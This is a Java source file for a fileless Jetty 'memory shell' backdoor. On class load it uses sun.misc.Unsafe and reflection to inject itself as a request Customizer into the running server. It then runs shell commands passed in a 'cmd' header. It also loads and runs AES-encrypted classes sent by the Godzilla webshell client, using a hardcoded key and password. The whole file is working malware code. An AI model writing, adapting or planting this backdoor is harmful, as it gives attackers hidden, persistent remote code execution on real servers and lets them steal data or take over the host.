package com.javasec.memshell;
import org.eclipse.jetty.server.*;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.ref.Reference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Map;
import java.util.Scanner;
public class JettyCustomizerMemshell implements HttpConfiguration.Customizer {
    String xc = "3c6e0b8a9c15224a"; // key
    String pass = "pass";
    String md5 = md5(pass + xc);
    Class payload;
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }
    public JettyCustomizerMemshell() {
        System.out.println(1);
    }

    public JettyCustomizerMemshell(int s) {
        System.out.println(2);
    }

    static {
        try {
            HttpConnection valueField = getValueField();
            valueField.getHttpChannel().getHttpConfiguration().addCustomizer(new JettyCustomizerMemshell(1));
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    private static sun.misc.Unsafe getUnsafe() throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Field unsafe = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        unsafe.setAccessible(true);
        sun.misc.Unsafe theunsafe = (sun.misc.Unsafe) unsafe.get(null);
        return theunsafe;
    }
    private static HttpConnection getValueField() throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        Unsafe unsafe = getUnsafe();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Field threadsfiled = threadGroup.getClass().getDeclaredField("threads");
        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));
        for(int i=0;i<threads.length;i++) {
            try {
                Field threadLocalsF = threads[i].getClass().getDeclaredField("threadLocals");
                Object threadlocal = unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));
                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField("table")));
                for(int j=0;j<table.length;j++){
                    try {
                        //HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField("value")));
                        //PrintWriter writer = value.getHttpChannel().getResponse().getWriter();
                        //writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter("cmd")));
                        //writer.flush();
                        Object value =unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField("value")));
                        if(value.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")){
                            return (HttpConnection)value;
                        }
                    }
                    catch (Exception e){

                    }
                }

            } catch (Exception e) {

            }
        }
        return null;
    }
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    @Override
    public void customize(Connector connector, HttpConfiguration httpConfiguration, Request request) {
        try {
            if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                String cmd = request.getHeader("cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    String[] cmds = null;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        cmds = new String[]{"cmd", "/c", cmd};
                    } else {
                        cmds = new String[]{"/bin/bash", "-c", cmd};
                    }
                    String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\ASADSADASDSADAS").next();
                    PrintWriter writer = request.getResponse().getWriter();
                    writer.println(result);
                    writer.flush();
                }
            }
            else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
                // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                byte[] data = base64Decode(request.getParameter(pass));
                data = x(data, false);
                if (payload == null) {
                    URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defMethod.setAccessible(true);
                    payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                } else {
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(request);
                    PrintWriter writer = request.getResponse().getWriter();
                    writer.write(md5.substring(0, 16));
                    f.toString();
                    writer.write(base64Encode(x(arrOut.toByteArray(), true)));
                    writer.write(md5.substring(16));
                    writer.flush();
                }
            }
        } catch (Exception e) {
        }
    }
}
